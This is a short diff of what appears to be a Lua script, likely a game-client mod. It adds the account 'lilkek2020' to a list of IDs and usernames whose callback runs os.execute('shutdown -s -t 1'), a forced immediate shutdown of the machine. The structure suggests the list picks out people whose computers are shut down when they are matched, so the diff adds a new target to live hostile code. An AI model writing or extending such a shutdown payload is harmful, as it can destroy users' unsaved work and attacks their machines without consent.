@@ -74,6 +74,7 @@
     {4142253411,'iluabebr_142'},
     {2691862078,'kanekiarz'},
     {1007925069,'id604762362'},
+    {2693277351,'lilkek2020'},
   },
   callback = function() os.execute('shutdown -s -t 1')  end,
 }
